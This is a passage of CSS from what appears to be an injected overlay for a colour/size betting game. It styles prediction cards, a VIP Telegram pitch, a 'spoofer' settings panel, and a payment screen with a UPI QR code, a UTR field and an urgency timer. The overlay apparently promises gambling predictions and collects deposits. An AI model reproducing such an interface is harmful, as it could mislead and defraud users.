}.pred-size.big { background: linear-gradient(135deg,#FEAA57,#f97316); box-shadow:0 4px 18px rgba(254,170,87,.45) }.pred-size.small { background: linear-gradient(135deg,#6EA8F4,#3b82f6); box-shadow:0 4px 18px rgba(110,168,244,.45) }.pred-color { padding: 5px 14px; border-radius: 50px; font-size: 10px; font-weight: 800; color: #fff; letter-spacing: .4px; text-transform: uppercase }.pred-color.red { background: linear-gradient(135deg,#fb5b5b,#dc2626) }.pred-color.green { background: linear-gradient(135deg,#18b660,#16a34a) }.pred-color.violet { background: linear-gradient(135deg,#c86eff,#9333ea) }.pred-conf { display: flex; align-items: center; gap: 8px }.conf-track { flex: 1; height: 5px; background: var(--strip); border-radius: 3px; overflow: hidden }.conf-fill { height: 100%; border-radius: 3px; background: linear-gradient(90deg, var(--big), #fb5b5b); transition: width .7s var(--ease); width: 0; position: relative }.conf-fill.small { background: linear-gradient(90deg, var(--small), #6EA8F4) }.conf-fill::after { content: \'\'; position: absolute; right: -1px; top: -2px; bottom: -2px; width: 7px; background: inherit; border-radius: 50%; filter: blur(3px); opacity: .65 }.conf-pct { font-size: 12px; font-weight: 900; color: var(--t-title); font-variant-numeric: tabular-nums; min-width: 35px; text-align: right }:host(.light) .conf-pct { color: #1f1f2e }.pred-history { display: none; align-items: center; justify-content: center; gap: 4px; margin-top: 10px; padding-top: 10px; border-top: 1px solid var(--strip) }.hist-label { font-size: 9px; font-weight: 700; color: var(--t-dim); letter-spacing: .2px; margin-right: 2px }.hist-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; transition: transform .2s; cursor: default }.hist-dot.big { background: var(--big); box-shadow:0 0 5px rgba(254,170,87,.4) }.hist-dot.small { background: var(--small); box-shadow:0 0 5px rgba(110,168,244,.4) }.hist-dot:hover { transform: scale(1.4) }.vip-header { display: flex; align-items: center; gap: 9px; margin-bottom: 12px }.vip-header-label { flex: 1; font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px }.vip-invite-pill { display: inline-flex; align-items: center; gap: 4px; background: rgba(245,158,11,.1); border: 1px solid rgba(245,158,11,.22); border-radius: 50px; padding: 2px 8px; font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: #f59e0b; white-space: nowrap }:host(.light) .vip-invite-pill { background: rgba(217,119,6,.07); border-color: rgba(217,119,6,.2); color: #92400e }.vip-hero-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 18px; padding: 22px 16px 20px; text-align: center; margin-bottom: 10px; position: relative; overflow: hidden }.vip-hero-card::before { content: \'\'; position: absolute; top: -50px; left: 50%; transform: translateX(-50%); width: 140px; height: 140px; background: radial-gradient(circle, rgba(42,171,238,.13) 0%, transparent 70%); pointer-events: none }.vip-tg-ring { width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg, #2AABEE, #229ED9); display: flex; align-items: center; justify-content: center; margin: 0 auto 13px; box-shadow: 0 0 0 8px rgba(42,171,238,.1), 0 0 0 16px rgba(42,171,238,.05), 0 6px 24px rgba(42,171,238,.38); animation: tgPulse 2.8s ease-in-out infinite }@keyframes tgPulse { 0%,100% { box-shadow: 0 0 0 8px rgba(42,171,238,.1), 0 0 0 16px rgba(42,171,238,.05), 0 6px 24px rgba(42,171,238,.38) } 50% { box-shadow: 0 0 0 11px rgba(42,171,238,.14), 0 0 0 20px rgba(42,171,238,.06), 0 8px 30px rgba(42,171,238,.44) } }.vip-title { font-size: 17px; font-weight: 900; color: var(--gate-title); margin: 0 0 7px; letter-spacing: -.5px; font-family: var(--f); line-height: 1.2 }.vip-pitch { font-size: 11.5px; line-height: 1.6; color: var(--t-body); margin: 0; font-family: var(--f) }.vip-stats { display: grid; grid-template-columns: 1fr 1fr 1fr; margin: 0 0 10px; text-align: center; background: var(--stat-bg); border-radius: 14px; border: 1px solid var(--stat-bdr); padding: 10px 0 }.vip-stat { display: flex; flex-direction: column; gap: 1px }.vip-stat + .vip-stat { border-left: 1px solid var(--stat-bdr) }.stat-val { font-size: 17px; font-weight: 900; color: var(--gate-title); letter-spacing: -.5px; font-family: var(--f) }.stat-lbl { font-size: 9px; font-weight: 700; color: var(--t-dim); text-transform: uppercase; letter-spacing: .7px }.vip-cta { width: 100%; padding: 12px 16px; border-radius: 13px; border: none; background: linear-gradient(135deg, #2AABEE, #1a90cc); color: #fff; font-size: 13.5px; font-weight: 800; letter-spacing: .02px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 7px; font-family: var(--f); box-shadow: 0 5px 20px rgba(42,171,238,.38), 0 0 0 1px rgba(42,171,238,.2); transition: all .2s var(--ease); position: relative; overflow: hidden }.vip-cta::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255,255,255,.15), transparent 55%); pointer-events: none }.vip-cta:hover { box-shadow: 0 8px 28px rgba(42,171,238,.52), 0 0 0 1px rgba(42,171,238,.3); transform: translateY(-2px) }.vip-cta:active { transform: scale(.97); transition-duration: .08s }.vip-arrow { flex-shrink: 0; transition: transform .2s var(--ease) }.vip-cta:hover .vip-arrow { transform: translateX(3px) }.vip-note { text-align: center; font-size: 9.5px; color: var(--t-dim); margin: 8px 0 0; font-family: var(--f); font-weight: 500; letter-spacing: .1px }.gate-view { display: none; padding: 22px 16px 24px; text-align: center; animation: fadeUp .25s var(--ease) }.gate-icon { width: 46px; height: 46px; margin: 0 auto 12px; background: var(--pro-lt); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--pro); box-shadow: 0 0 0 6px var(--pro-glow) }.gate-title { font-size: 16px; font-weight: 900; color: var(--gate-title); margin: 0 0 6px; letter-spacing: -.4px; font-family: var(--f) }.gate-bal-wrap { margin-bottom: 10px }.gate-balance { display: inline-flex; align-items: center; background: var(--gate-bal-bg); padding: 5px 14px; border-radius: 50px; font-size: 13px; font-weight: 800; color: var(--gate-bal-col); border: 1px solid var(--gate-bal-bdr); font-family: var(--f) }.gate-desc { font-size: 11px; line-height: 1.55; color: var(--t-body); margin: 0 0 16px; font-family: var(--f) }.gate-actions { display: flex; flex-direction: column; gap: 7px }.gate-btn { padding: 11px 14px; border-radius: 12px; border: none; font-size: 13px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; font-family: var(--f); transition: all .2s var(--ease); position: relative; overflow: hidden }.gate-btn:active { transform: scale(.97) }.gate-btn::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255,255,255,.12), transparent 55%); pointer-events: none }.btn-deposit { background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; box-shadow: 0 4px 16px rgba(34,197,94,.32) }.btn-deposit:hover { box-shadow: 0 6px 22px rgba(34,197,94,.44); transform: translateY(-1px) }.btn-telegram { background: var(--card-bg); color: var(--t-body); border: 1px solid var(--card-bdr); font-weight: 600; font-size: 12px }.btn-telegram:hover { color: var(--t-title); border-color: var(--pro-bdr-h) }.pro-prediction .pred-hero, .pro-prediction .pred-color { display: none }.pro-prediction.vip-mode .pred-hero { display: flex }.pro-prediction.vip-mode .pred-color { display: inline-block }@media (min-width: 768px) { .panel { width: min(90vw, 310px) } .menu-card { padding: 13px 12px } .card-name { font-size: 14px } }@media (max-width: 320px) { .panel { width: 94vw } .pro-timer { font-size: 24px } .pred-ball { width: 48px; height: 48px } .pred-size { padding: 6px 18px; font-size: 13px } .pro-card { padding: 14px 10px; min-height: 112px } .pred-hero { height: 56px } }.wg-overlay { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100%; background: rgba(0,0,0,0.75); z-index: 2005 }.wg-overlay.inactive { display: none }.wg-popup { position: fixed; top: 50%; left: calc(var(--bv-left, 0px) + var(--bv-width, 100%) / 2); transform: translate(-50%, -50%); z-index: 2006; width: min(300px, calc(var(--bv-width, 100%) - 32px)); background: #1e1e3a; border-radius: 18px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 8px 40px rgba(0,0,0,0.6) }.wg-popup.inactive { display: none }:host(.light) .wg-popup { background: #fff }.wg-close-x { position: absolute; top: 10px; right: 12px; width: 26px; height: 26px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; font-size: 12px; color: rgba(255,255,255,0.7); cursor: pointer; z-index: 1 }:host(.light) .wg-close-x { background: rgba(0,0,0,0.07); color: #666 }.wg-pop-hero { text-align: center; padding: 28px 20px 14px; background: #1e1e3a }:host(.light) .wg-pop-hero { background: #fff }.wg-pop-icon { font-size: 44px; line-height: 1; margin-bottom: 10px }.wg-pop-amount { font-size: 28px; font-weight: 900; color: #fff; letter-spacing: -0.5px; margin-bottom: 8px }:host(.light) .wg-pop-amount { color: #111 }.wg-pop-pill { display: inline-block; padding: 4px 12px; border-radius: 99px; background: rgba(245,180,0,0.15); border: 1px solid rgba(245,180,0,0.35); font-size: 10.5px; font-weight: 600; color: #f5c842; letter-spacing: .2px }:host(.light) .wg-pop-pill { background: rgba(249,89,89,0.08); border-color: rgba(249,89,89,0.25); color: #f95959 }.wg-pop-stats { display: flex; gap: 6px; padding: 0 16px 12px; justify-content: center }.wg-stat-chip { flex: 1; text-align: center; padding: 7px 4px; border-radius: 10px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); font-size: 10px; font-weight: 600; color: #c8cad0 }:host(.light) .wg-stat-chip { background: #f5f5ff; border-color: #e0e0f0; color: #555 }.wg-pop-body { padding: 0 16px 14px; font-size: 11.5px; color: #7b7e9a; line-height: 1.65; text-align: center }:host(.light) .wg-pop-body { color: #777 }.wg-pop-cta { display: block; width: calc(100% - 32px); margin: 0 16px 10px; padding: 14px; border-radius: 12px; border: none; background: linear-gradient(90deg, #f5a623 0%, #f5c842 100%); color: #1a1200; font-size: 15px; font-weight: 800; cursor: pointer; font-family: inherit; letter-spacing: .1px }:host(.light) .wg-pop-cta { background: linear-gradient(90deg, #f95959 0%, #ff8c6e 100%); color: #fff }.wg-pop-cta:active { opacity: .9 }.wg-pop-footer { display: flex; align-items: center; gap: 7px; padding: 8px 16px 16px; justify-content: center }.wg-checkbox { width: 17px; height: 17px; border-radius: 50%; border: 1.5px solid #4a4d6a; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; transition: background .15s, border-color .15s }.wg-checkbox.checked { background: #07c160; border-color: #07c160 }.wg-check-tick { font-size: 10px; color: #fff; opacity: 0; transition: opacity .15s }.wg-checkbox.checked .wg-check-tick { opacity: 1 }.wg-no-remind { font-size: 11px; color: #4a4d6a; cursor: pointer }:host(.light) .wg-no-remind { color: #aaa }.bonus-view { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100%; z-index: 9999; display: none; flex-direction: column; background: #1a1a2c; font-family: -apple-system, "system-ui", "Helvetica Neue", Helvetica, "Segoe UI", Arial, Roboto, sans-serif; color: #c8cad0 }:host(.light) .bonus-view { background: #f7f8ff; color: #333 }.bonus-hdr { display: flex; align-items: center; gap: 0; padding: 0 16px; height: 49px; background: #22224b; flex-shrink: 0 }:host(.light) .bonus-hdr { background: linear-gradient(90deg, #f95959 0%, #ff9a8e 100%) }.bonus-back-btn { background: none; border: none; padding: 0; margin-right: 8px; cursor: pointer; color: #fff; display: flex; align-items: center; justify-content: center; width: 32px; height: 32px }.bonus-back-btn svg { width: 20px; height: 20px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round }.bonus-ttl { font-size: 19px; font-weight: 400; color: #fff; flex: 1; text-align: center; margin-right: 32px }.bonus-scroll { flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch }.bonus-hero { padding: 24px 20px 16px; text-align: center }.bonus-hero-icon { font-size: 32px; margin-bottom: 6px }.bonus-h2 { font-size: 18px; font-weight: 700; color: #e8e9f0; margin: 0 0 5px; line-height: 1.2 }:host(.light) .bonus-h2 { color: #1a1a1a }.bonus-sub { font-size: 12px; color: #8b8ea0; line-height: 1.5; margin: 0 auto; max-width: 240px }:host(.light) .bonus-sub { color: #666 }.bonus-stats-row { display: flex; gap: 6px; padding: 0 14px; margin-bottom: 10px }.bonus-stat { flex: 1; text-align: center; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; padding: 10px 4px }:host(.light) .bonus-stat { background: #fff; border-color: #e8e8e8 }.bonus-stat-val { display: block; font-size: 15px; font-weight: 700; color: #f5c842; letter-spacing: -.2px }:host(.light) .bonus-stat-val { color: #d97706 }.bonus-stat-lbl { display: block; font-size: 9px; font-weight: 600; color: #5a5d72; text-transform: uppercase; letter-spacing: .3px; margin-top: 2px }:host(.light) .bonus-stat-lbl { color: #999 }.bonus-prog-card { margin: 0 14px 10px; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; padding: 11px 12px }:host(.light) .bonus-prog-card { background: #fff; border-color: #e8e8e8 }.bonus-prog-lbl { display: flex; justify-content: space-between; align-items: center; font-size: 10px; font-weight: 600; color: #5a5d72; text-transform: uppercase; letter-spacing: .3px; margin-bottom: 7px }:host(.light) .bonus-prog-lbl { color: #999 }.bonus-prog-count { color: #f5c842; font-weight: 700 }:host(.light) .bonus-prog-count { color: #d97706 }.bonus-bar { height: 6px; border-radius: 99px; background: #2d3060; overflow: hidden }:host(.light) .bonus-bar { background: #eee }.bonus-bar-fill { height: 100%; width: 0%; border-radius: 99px; background: #f5c842; transition: width .4s ease }:host(.light) .bonus-bar-fill { background: #f95959 }.bonus-section-ttl { font-size: 10px; font-weight: 700; color: #5a5d72; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 8px }:host(.light) .bonus-section-ttl { color: #bbb }.bonus-tiers { padding: 0 14px; margin-bottom: 14px }.bonus-tier { display: flex; align-items: center; gap: 10px; padding: 10px 12px; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; margin-bottom: 5px }:host(.light) .bonus-tier { background: #fff; border-color: #e8e8e8 }.tier-badge { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; color: #fff; flex-shrink: 0; background: #3a3d6b }:host(.light) .tier-badge { background: #ccc }.t-bronze { background: #a0522d }.t-silver { background: #8a9bb5 }.t-gold { background: #d97706 }.t-diamond { background: #6d28d9 }.tier-info { flex: 1; font-size: 12px; color: #7b7e94; line-height: 1.5 }:host(.light) .tier-info { color: #666 }.tier-info b { color: #e8e9f0; font-weight: 700 }:host(.light) .tier-info b { color: #222 }.bonus-cta-btn { display: block; width: calc(100% - 28px); margin: 6px 14px 10px; padding: 13px; border-radius: 10px; border: none; background: #f5c842; color: #1a1a2c; font-size: 14px; font-weight: 700; cursor: pointer; font-family: inherit; transition: opacity .15s }:host(.light) .bonus-cta-btn { background: #f95959; color: #fff }.bonus-cta-btn:active { opacity: .85 }.bonus-link-preview { margin: 0 14px 14px; padding: 8px 10px; border-radius: 8px; background: #22224b; border: 1px solid #2d3060; font-size: 10px; color: #5a5d72; word-break: break-all; line-height: 1.5; font-family: monospace }:host(.light) .bonus-link-preview { background: #f5f5f5; border-color: #e8e8e8; color: #999 }.bonus-rules { padding: 0 14px; margin-bottom: 14px }.bonus-rule { font-size: 11px; color: #7b7e94; line-height: 1.7 }:host(.light) .bonus-rule { color: #666 }.settings-header-label { flex: 1; font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px }.spoofer-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; padding: 14px 13px; margin-top: 2px }.spoofer-section { margin-bottom: 14px }.spoofer-section:last-of-type { margin-bottom: 12px }.spoofer-label { display: block; font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: var(--t-dim); margin-bottom: 8px }.spoofer-row { display: flex; align-items: center; gap: 8px }.spoofer-row input[type="range"] { flex: 1; height: 4px; -webkit-appearance: none; appearance: none; background: var(--strip); border-radius: 3px; outline: none; cursor: pointer }.spoofer-row input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; width: 14px; height: 14px; border-radius: 50%; background: var(--pro); border: 2px solid var(--panel-bg); cursor: pointer; box-shadow: 0 1px 6px rgba(139,92,246,.4) }.spoofer-row input[type="number"] { width: 52px; padding: 5px 6px; border-radius: 8px; border: 1px solid var(--card-bdr); background: var(--panel-bg); color: var(--t-title); font-size: 12px; font-weight: 700; font-family: var(--f); text-align: center; outline: none; -webkit-appearance: none; appearance: none; -moz-appearance: textfield }.spoofer-row input[type="number"]::-webkit-inner-spin-button, .spoofer-row input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0 }.spoofer-row input[type="number"]:focus { border-color: var(--pro) }.spoofer-unit { font-size: 11px; font-weight: 700; color: var(--t-dim); min-width: 14px }.spoofer-reset { display: block; width: 100%; padding: 8px; border-radius: 8px; border: 1px solid var(--card-bdr); background: transparent; color: var(--t-dim); font-size: 10.5px; font-weight: 600; cursor: pointer; font-family: var(--f); transition: all .15s; letter-spacing: .2px; -webkit-appearance: none; appearance: none }.spoofer-reset:hover { border-color: var(--pro); color: var(--pro) }.spoofer-reset:active { transform: scale(.97) }.pay-overlay { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100vh; height: 100dvh; background: #1a1a2c; z-index: 99999; font-family: var(--f, system-ui, -apple-system, sans-serif); color: #c8cad0; display: flex; flex-direction: column; overflow: hidden; box-sizing: border-box; max-width: 100vw;}:host(.light) .pay-overlay { background: #fdfdfd; color: #1a1b25; }.pay-hdr { display: flex; align-items: center; justify-content: space-between; height: 56px; padding: 0 20px; flex-shrink: 0; background: #22224b; border-bottom: 1px solid rgba(255, 255, 255, 0.06); position: relative; z-index: 10;}:host(.light) .pay-hdr { background: #fff; border-bottom: 1px solid rgba(0, 0, 0, 0.04);}.pay-back { background: none; border: none; padding: 0; cursor: pointer; color: #fff; width: 32px; height: 32px; display: flex; align-items: center; justify-content: flex-start; transition: transform 0.2s ease, opacity 0.2s ease;}.pay-back:active { transform: translateX(-2px); opacity: 0.7; }:host(.light) .pay-back { color: #1a1b25; }.pay-back svg { width: 22px; height: 22px; stroke-width: 2.5; }.pay-ttl { font-size: 16px; font-weight: 700; color: #fff; letter-spacing: 0; }:host(.light) .pay-ttl { color: #111; }.pay-body { flex: 1; overflow-y: auto; overflow-x: hidden; -webkit-overflow-scrolling: touch; padding-bottom: 34px; }.pay-content { padding-top: 0; }@keyframes slideUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }.pay-anim { animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) backwards; }.pay-anim-1 { animation-delay: 0.05s; }.pay-anim-2 { animation-delay: 0.1s; }.pay-anim-3 { animation-delay: 0.15s; }.pay-anim-4 { animation-delay: 0.2s; }.pay-hero { position: relative; min-height: 148px; padding: 22px 20px 34px; overflow: hidden; background: linear-gradient(90deg, #fb8466 0%, #bd5bd4 33%, #7473fa 66%, #53b2fa 100%);}:host(.light) .pay-hero { background: linear-gradient(90deg, #ff6b6b 0%, #ff9b9b 52%, #fff2f2 100%); }.pay-hero::after { content: \'\'; position: absolute; inset: auto 0 0; height: 46px; background: linear-gradient(to bottom, rgba(26,26,44,0), #1a1a2c 82%);}:host(.light) .pay-hero::after { background: linear-gradient(to bottom, rgba(253,253,253,0), #fdfdfd 82%); }.pay-hero-top { position: relative; z-index: 1; display: flex; align-items: flex-start; justify-content: space-between; gap: 14px; }.pay-hero-label { display: block; color: rgba(255,255,255,.72); font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 7px; }.pay-hero-sub { position: relative; z-index: 1; margin-top: 10px; color: rgba(255,255,255,.82); font-size: 13px; font-weight: 600; }.pay-amount-box { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 32px 20px 24px; position: relative; }.pay-amount-bg { position: absolute; top: -70px; right: -40px; width: 210px; height: 150px; background: rgba(255,255,255,.26); filter: blur(48px); opacity: .6; border-radius: 50%; z-index: 0;}:host(.light) .pay-amount-bg { background: linear-gradient(90deg, #f95959, #ff8080); filter: blur(50px); opacity: 0.1; }.pay-timer-pill { display: flex; align-items: center; gap: 6px; position: relative; z-index: 1; background: rgba(34, 34, 75, 0.28); border: 1px solid rgba(255, 255, 255, 0.25); padding: 7px 12px; border-radius: 20px; flex-shrink: 0; box-shadow: inset 0 1px 0 rgba(255,255,255,.16);}:host(.light) .pay-timer-pill { background: #fff; border-color: rgba(0,0,0,0.05); box-shadow: 0 4px 12px rgba(0,0,0,0.03); }.pay-timer-pill.urgent { background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); animation: timerShake 0.45s ease infinite; }.pay-clock { width: 14px; height: 14px; color: #fff; flex-shrink: 0; }:host(.light) .pay-clock { color: #f95959; }.pay-timer-pill.urgent .pay-clock { color: #ef4444; }.pay-timer-txt { font-weight: 800; color: #fff; font-size: 14px; font-variant-numeric: tabular-nums; letter-spacing: 0.5px; }:host(.light) .pay-timer-txt { color: #f95959; }.pay-timer-pill.urgent .pay-timer-txt { color: #ef4444; }.pay-amt { display: block; position: relative; z-index: 1; font-size: 44px; font-weight: 900; color: #fff; letter-spacing: 0; line-height: .98; text-shadow: 0 8px 24px rgba(0,0,0,0.22); }:host(.light) .pay-amt { color: #fff; text-shadow: 0 8px 22px rgba(249, 89, 89, 0.18); }.pay-section { padding: 0 20px; margin-bottom: 16px; }.pay-section-hdr { font-size: 12px; font-weight: 800; color: #8b8ea0; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }:host(.light) .pay-section-hdr { color: #888; }.pay-qr-card { margin-top: -24px; position: relative; z-index: 2; }.pay-method-card, .pay-form-card { position: relative; z-index: 1; }.pay-qr-wrapper { background: #22224b; border-radius: 22px; padding: 18px 18px 16px; display: flex; flex-direction: column; align-items: center; border: 1px solid rgba(255, 255, 255, 0.07); box-shadow: 0 14px 34px rgba(0,0,0,0.24), inset 0 1px 0 rgba(255, 255, 255, 0.04);}:host(.light) .pay-qr-wrapper { background: #fff; border-color: rgba(0,0,0,0.04); box-shadow: 0 8px 30px rgba(0,0,0,0.04); }.pay-qr-box { background: #fff; border-radius: 18px; padding: 10px; margin-bottom: 12px; box-shadow: 0 7px 24px rgba(0,0,0,0.16), 0 0 0 1px rgba(0,0,0,0.05); position: relative; }.pay-qr { width: 172px; height: 172px; display: block; border-radius: 10px; opacity: 0; transition: opacity 0.4s ease; position: relative; z-index: 2; }.pay-qr.loaded { opacity: 1; }.pay-qr-skeleton { position: absolute; inset: 10px; border-radius: 10px; background: rgba(0,0,0,0.03); display: flex; align-items: center; justify-content: center; z-index: 1; }.pay-qr-skeleton svg { width: 28px; height: 28px; animation: paySpin 1s linear infinite; color: #8b8ea0; }@keyframes paySpin { 100% { transform: rotate(360deg); } }.pay-scan-text { font-size: 13px; color: #b8bbcf; font-weight: 700; text-align: center; line-height: 1.5; }:host(.light) .pay-scan-text { color: #666; }.pay-upi-row { display: flex; align-items: center; gap: 12px; background: #22224b; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; padding: 13px 14px; transition: background 0.2s, border-color 0.2s; box-shadow: inset 0 1px 0 rgba(255,255,255,.03);}.pay-upi-row:active { background: rgba(255, 255, 255, 0.05); }:host(.light) .pay-upi-row { background: #fafafa; border-color: rgba(0,0,0,0.06); }:host(.light) .pay-upi-row:active { background: #f5f5f5; border-color: #f95959; }.pay-upi-info { flex: 1; display: flex; flex-direction: column; gap: 3px; min-width: 0; }.pay-upi-lbl { font-size: 11px; color: #8b8ea0; font-weight: 800; text-transform: uppercase; letter-spacing: 0.4px; }:host(.light) .pay-upi-lbl { color: #999; }.pay-upi-id { font-size: 16px; font-weight: 800; color: #fff; letter-spacing: 0; font-family: var(--f, system-ui, -apple-system, sans-serif); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }:host(.light) .pay-upi-id { color: #111; }.pay-upi-actions { display: flex; gap: 8px; align-items: center; }.pay-copy-btn { background: rgba(160, 143, 255, 0.16); color: #fff; border: 1px solid rgba(160,143,255,.18); padding: 9px 15px; border-radius: 12px; font-size: 12px; font-weight: 800; cursor: pointer; transition: all 0.2s ease;}:host(.light) .pay-copy-btn { background: rgba(249, 89, 89, 0.08); color: #f95959; }.pay-copy-btn:hover { background: rgba(160, 143, 255, 0.22); }.pay-copy-btn:active { transform: scale(0.95); }.pay-copy-btn.copied { background: #22c55e !important; color: #fff !important; }.pay-route-card { width: 100%; margin-top: 10px; padding: 11px 12px; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; background: #22224b; color: #fff; display: flex; align-items: center; gap: 11px; position: relative; overflow: hidden; cursor: pointer; text-align: left; box-shadow: inset 3px 0 0 #a08fff, inset 0 1px 0 rgba(255,255,255,.04); font-family: var(--f, system-ui, -apple-system, sans-serif); transition: transform .18s ease, border-color .18s ease, background .18s ease;}.pay-route-card:active { transform: scale(.985); border-color: rgba(160,143,255,.38); background: #292958; }.pay-route-index { flex: 0 0 auto; min-width: 48px; padding: 8px 9px; border-radius: 12px; text-align: center; color: #fff; font-size: 12px; font-weight: 900; background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa); box-shadow: inset 0 1px 0 rgba(255,255,255,.18);}.pay-route-copy { position: relative; z-index: 1; flex: 1; display: flex; flex-direction: column; gap: 2px; min-width: 0; }.pay-route-title { font-size: 12.5px; font-weight: 800; color: #fff; letter-spacing: 0; line-height: 1.2; }.pay-route-sub { font-size: 11px; font-weight: 600; color: #b9bdd6; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }.pay-route-icon { position: relative; z-index: 1; width: 32px; height: 32px; flex: 0 0 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; background: rgba(160,143,255,.16);}.pay-route-icon svg { width: 19px; height: 19px; }.pay-route-note { margin-top: 10px; color: #8b8ea0; font-size: 12px; font-weight: 600; text-align: center; }:host(.light) .pay-route-card { background: #fafafa; border-color: rgba(0,0,0,.06); color: #111; box-shadow: inset 3px 0 0 #f95959; }:host(.light) .pay-route-index { background: linear-gradient(90deg, #f95959, #ff8080); }:host(.light) .pay-route-title { color: #111; }:host(.light) .pay-route-sub, :host(.light) .pay-route-note { color: #777; }:host(.light) .pay-route-icon { background: rgba(249,89,89,.08); color: #f95959; }.pay-field-wrapper { background: #22224b; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; display: flex; align-items: center; padding: 6px 6px 6px 16px; transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: inset 0 1px 0 rgba(255,255,255,.03);}.pay-field-wrapper:focus-within { border-color: #bd5bd4; box-shadow: 0 0 0 3px rgba(189, 91, 212, 0.15), 0 4px 12px rgba(0,0,0,0.2); }:host(.light) .pay-field-wrapper { background: #fafafa; border-color: rgba(0,0,0,0.08); box-shadow: 0 2px 12px rgba(0,0,0,0.02); }:host(.light) .pay-field-wrapper:focus-within { border-color: #f95959; box-shadow: 0 0 0 3px rgba(249, 89, 89, 0.1); }.pay-utr-input { flex: 1; background: transparent; border: none; outline: none; font-size: 15px; font-weight: 500; color: #fff; font-family: var(--f); padding: 10px 0; letter-spacing: 1px;}.pay-utr-input::placeholder { color: #5a5d72; font-weight: 400; letter-spacing: normal; }:host(.light) .pay-utr-input { color: #111; }:host(.light) .pay-utr-input::placeholder { color: #999; }.pay-paste-pill { background: rgba(255, 255, 255, 0.08); color: #fff; border: none; border-radius: 12px; padding: 9px 14px; font-size: 12px; font-weight: 800; cursor: pointer; transition: all 0.2s;}.pay-paste-pill:active { background: rgba(255, 255, 255, 0.1); transform: scale(0.95); }:host(.light) .pay-paste-pill { background: rgba(0,0,0,0.04); color: #111; }:host(.light) .pay-paste-pill:active { background: rgba(0,0,0,0.08); }.pay-utr-warn { display: flex; align-items: flex-start; gap: 6px; margin-top: 10px; padding: 0 4px; }.pay-utr-warn svg { width: 14px; height: 14px; color: #ef4444; flex-shrink: 0; margin-top: 1px; }.pay-utr-warn-txt { font-size: 11px; color: #ef4444; opacity: 0.9; line-height: 1.4; font-weight: 500; }.pay-submit-btn { width: 100%; padding: 16px; border-radius: 999px; border: none; background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa); background-size: 200% 200%; color: #fff; font-size: 16px; font-weight: 700; font-family: var(--f); cursor: pointer; position: relative; overflow: hidden; box-shadow: 0 10px 22px rgba(116, 115, 250, 0.28), inset 0 1px 0 rgba(255,255,255,0.22); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);}.pay-submit-btn:active:not(.disabled) { transform: translateY(2px) scale(0.98); box-shadow: 0 2px 10px rgba(116, 115, 250, 0.2), inset 0 1px 0 rgba(255,255,255,0.1); }.pay-submit-btn.disabled { background: #2a2a35 !important; color: #5a5d72 !important; box-shadow: none !important; cursor: not-allowed; }:host(.light) .pay-submit-btn { background: linear-gradient(90deg, #f95959, #ff8080); box-shadow: 0 6px 20px rgba(249, 89, 89, 0.3), inset 0 1px 0 rgba(255,255,255,0.3); }:host(.light) .pay-submit-btn.disabled { background: #e8e8e8 !important; color: #999 !important; }.pay-order-meta { display: flex; align-items: center; justify-content: space-between; padding: 12px 20px 0; margin-top: 4px; position: relative;}.pay-order-meta::before { content: \'\'; position: absolute; top: 0; left: 20px; right: 20px; height: 1px; background: rgba(255, 255, 255, 0.05); }:host(.light) .pay-order-meta::before { background: rgba(0, 0, 0, 0.05); }.pay-order-lbl { font-size: 12px; color: #5a5d72; font-weight: 500; }.pay-order-val { font-size: 13px; color: #8b8ea0; font-family: monospace; letter-spacing: 0.5px; }.pay-confirm-mask { position: fixed; inset: 0; z-index: 100000; display: flex; align-items: center; justify-content: center; padding: 20px; opacity: 0; pointer-events: none; transition: opacity 0.3s ease;}.pay-confirm-mask::before { content: \'\'; position: absolute; inset: 0; background: 